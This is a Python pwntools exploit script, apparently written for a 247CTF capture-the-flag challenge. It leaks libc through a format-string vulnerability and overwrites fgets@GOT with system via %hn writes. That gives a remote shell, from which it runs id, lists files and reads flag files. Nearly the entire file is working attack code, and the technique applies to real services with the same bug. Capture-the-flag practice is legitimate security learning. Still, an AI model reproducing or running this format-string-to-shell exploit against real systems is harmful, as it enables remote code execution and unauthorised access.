#!/usr/bin/env python3
"""
Exploit: Overwrite fgets@GOT → system

CORRECTED: GOT 0x804a010 is printf (offset 0x50b60), NOT puts (0x67b60).
The libc base was off by 0x17000 in all previous attempts!

GOT layout:
  0x804a00c: setbuf    (0x6df10)
  0x804a010: printf    (0x50b60)  ← used for libc leak
  0x804a014: internal
  0x804a018: fgets     (0x65810)  ← input function, target for overwrite
  0x804a01c: __stack_chk_fail (unresolved)
  0x804a020: puts      (0x67360)
  0x804a024: getenv    (0x2f560)

Flow:
1. fgets(buf, size, stdin) reads our payload
2. __printf_chk(1, buf) processes format string, overwrites fgets@GOT → system
3. Program outputs messages and loops back
4. fgets(buf, size, stdin) → system(buf)
5. buf still has "sh #..." → system("sh #...") → /bin/sh runs sh, # comments rest
6. Shell!
"""
from pwn import *
import time
import re

context.log_level = 'info'

HOST = 'e1cd4d531439c655.247ctf.com'
PORT = 50247

# CORRECTED offsets
PRINTF_GOT    = 0x804a010
PRINTF_OFFSET = 0x50b60
SYSTEM_OFFSET = 0x3cd10
FGETS_GOT     = 0x804a018

r = remote(HOST, PORT, timeout=15)
time.sleep(0.5)
try:
    r.recvuntil(b"again?\n", timeout=4)
except:
    r.recv(4096, timeout=1)

def sync():
    try:
        return r.recvuntil(b"again?\n", timeout=4)
    except:
        data = b''
        while True:
            try:
                chunk = r.recv(4096, timeout=1)
                if chunk: data += chunk
                else: break
            except: break
        return data

# Step 1: Leak libc via printf@GOT
log.info("Leaking libc via printf@GOT...")
r.sendline(p32(PRINTF_GOT) + b'XXXX%11$s')
resp = sync()
idx = resp.find(b'XXXX')
printf_addr = u32(resp[idx+4:idx+8])
libc = printf_addr - PRINTF_OFFSET
system_addr = libc + SYSTEM_OFFSET
log.info(f"printf@libc = {hex(printf_addr)}")
log.info(f"libc base   = {hex(libc)}")
log.info(f"system      = {hex(system_addr)}")

# Step 2: Build payload to overwrite fgets@GOT → system
# Format: "sh #" + p32(FGETS_GOT) + p32(FGETS_GOT+2) + %hn writes
# "sh #" = 4 bytes, occupies stack offset 11
# p32(FGETS_GOT) at offset 12
# p32(FGETS_GOT+2) at offset 13
prefix = b'sh #'
addr_lo = p32(FGETS_GOT)        # write low 2 bytes here
addr_hi = p32(FGETS_GOT + 2)    # write high 2 bytes here
initial = 12                     # 4 + 4 + 4 bytes printed before format specs

sys_lo = system_addr & 0xffff
sys_hi = (system_addr >> 16) & 0xffff
log.info(f"system lo={hex(sys_lo)}, hi={hex(sys_hi)}")

if sys_lo <= sys_hi:
    pad1 = (sys_lo - initial) % 0x10000
    pad2 = (sys_hi - sys_lo) % 0x10000
    fmt = b''
    if pad1 > 0: fmt += f'%{pad1}c'.encode()
    fmt += b'%12$hn'
    if pad2 > 0: fmt += f'%{pad2}c'.encode()
    fmt += b'%13$hn'
else:
    pad1 = (sys_hi - initial) % 0x10000
    pad2 = (sys_lo - sys_hi) % 0x10000
    fmt = b''
    if pad1 > 0: fmt += f'%{pad1}c'.encode()
    fmt += b'%13$hn'
    if pad2 > 0: fmt += f'%{pad2}c'.encode()
    fmt += b'%12$hn'

payload = prefix + addr_lo + addr_hi + fmt
log.info(f"Payload: {len(payload)} bytes")

if len(payload) > 63:
    log.error("Payload too long!")
    r.close()
    exit(1)

# Step 3: Send the exploit
log.info("Sending exploit...")
r.sendline(payload)

# Step 4: Drain the format string output (~63k padding bytes + messages)
log.info("Draining format string output...")
time.sleep(1)
all_output = b''
while True:
    try:
        chunk = r.recv(65536, timeout=5)
        if chunk:
            all_output += chunk
        else:
            break
    except:
        break

log.info(f"Drained {len(all_output)} bytes")

# Check for flag in drained output
if b'247CTF' in all_output:
    match = re.search(rb'247CTF\{[^}]+\}', all_output)
    if match:
        log.success(f"FLAG: {match.group(0).decode()}")
        with open('flag.txt', 'w') as f:
            f.write('247CTF{XXXXXXXXXXXXXXXXXXXX}\n')
        r.close()
        exit(0)

# Step 5: Now system(buf) should have started sh
# sh is reading from stdin (the socket)
log.info("Trying shell interaction...")
try:
    r.sendline(b'id')
    time.sleep(1)

    out = b''
    while True:
        try:
            chunk = r.recv(4096, timeout=2)
            if chunk: out += chunk
            else: break
        except: break

    log.info(f"id output ({len(out)} bytes): {out[:300]}")

    if b'uid=' in out:
        log.success("Got shell!")

    # Try to get the flag
    r.sendline(b'cat flag* 2>/dev/null')
    time.sleep(1)
    r.sendline(b'cat /flag* 2>/dev/null')
    time.sleep(1)
    r.sendline(b'ls -la')
    time.sleep(1)

    out2 = b''
    while True:
        try:
            chunk = r.recv(4096, timeout=2)
            if chunk: out2 += chunk
            else: break
        except: break

    log.info(f"Flag output ({len(out2)} bytes): {out2[:500]}")

    all_out = out + out2
    if b'247CTF' in all_out:
        match = re.search(rb'247CTF\{[^}]+\}', all_out)
        if match:
            log.success(f"FLAG: {match.group(0).decode()}")
            with open('flag.txt', 'w') as f:
                f.write('247CTF{XXXXXXXXXXXXXXXXXXXX}\n')

    # Go interactive for manual exploration
    r.interactive()

except EOFError:
    log.warning("Connection closed")
except Exception as e:
    log.warning(f"Error: {e}")

r.close()
